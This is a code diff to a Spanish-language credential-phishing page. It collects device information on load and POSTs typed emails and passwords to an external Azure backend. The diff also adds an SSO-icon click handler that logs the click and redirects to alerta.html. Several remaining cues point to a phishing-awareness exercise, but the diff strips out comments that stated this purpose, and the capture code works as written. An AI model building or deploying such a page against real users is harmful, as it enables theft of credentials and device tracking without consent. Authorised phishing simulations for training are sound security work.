@@ -167,11 +167,11 @@
 
         /* Estilo para la imagen de opciones de inicio de sesión */
         .login-options-image {
-            width: 100%; /* Ajusta el ancho según sea necesario, 100% para que sea responsivo dentro del contenedor */
-            max-width: 300px; /* Tamaño máximo para la imagen */
-            height: auto; /* Mantiene la proporción */
-            margin-top: 20px; /* Espacio superior */
-            display: block; /* Para centrarla con margin: auto */
+            width: 100%; 
+            max-width: 300px; 
+            height: auto; 
+            margin-top: 20px; 
+            display: block; 
             margin-left: auto;
             margin-right: auto;
             cursor: pointer; /* Indica que la imagen es clicable */
@@ -199,7 +199,7 @@
             <button type="submit" class="btn">Acceder a Recursos</button>
         </form>
 
-        <a href="alerta.html">
+        <a href="#" id="ssoClickTrigger">
             <img src="iconos.png" alt="Opciones de inicio de sesión con Google, Microsoft o Apple" class="login-options-image">
         </a>
         
@@ -260,7 +260,6 @@
     // Función para enviar datos al backend
     async function sendDataToBackend(endpoint, data) {
         try {
-            // Se mantiene la URL del backend tal cual la tenías para el ejercicio de phishing
             const response = await fetch(`https://qr-eedjftcsfrcja7h3.chilecentral-01.azurewebsites.net${endpoint}`, {
                 method: 'POST',
                 headers: {
@@ -275,13 +274,13 @@
         }
     }
 
-    // Al cargar la página, enviar información de visita (solo si es parte del ejercicio)
+    // Al cargar la página, enviar información de visita
     window.addEventListener('load', function() {
         const deviceInfo = collectDeviceInfo();
         sendDataToBackend('/api/track-visit', deviceInfo);
     });
 
-    // Manejar el envío del formulario (aquí es donde se activan las advertencias)
+    // Manejar el envío del formulario (para credenciales)
     document.getElementById('phishingForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         
@@ -296,8 +295,9 @@
         // Enviar datos de la sumisión al backend
         const submissionData = {
             email: email,
-            password: password,
-            device_info: deviceInfo
+            password: password, // Precaución: En demo ok, en real NUNCA enviar así
+            device_info: deviceInfo,
+            scenario: "Formulario_Directo" // Para diferenciar en las estadísticas
         };
         await sendDataToBackend('/api/track-submission', submissionData);
 
@@ -323,6 +323,26 @@
             
         }, 1500);
     });
-</script>
+
+    // NUEVO: Manejar el clic en la imagen SSO para simular un envío de formulario
+    document.getElementById('ssoClickTrigger').addEventListener('click', async function(e) {
+        e.preventDefault(); // Evita el comportamiento por defecto del enlace (que es navegar a #)
+
+        const deviceInfo = collectDeviceInfo();
+        
+        // Simular un envío de formulario para el escenario SSO
+        const ssoSubmissionData = {
+            email: "sso_click_simulado@ejemplo.com", // Puedes usar un email distintivo
+            password: "SSO_CLICK", // O una cadena distintiva para la contraseña
+            device_info: deviceInfo,
+            scenario: "Clic_SSO" // Añade un campo para diferenciar este tipo de "envío"
+        };
+        
+        await sendDataToBackend('/api/track-submission', ssoSubmissionData); // Envía al mismo endpoint
+
+        // Redirigir a la página de alerta después de simular el envío
+        window.location.href = "alerta.html";
+    });
+    </script>
 </body>
 </html>
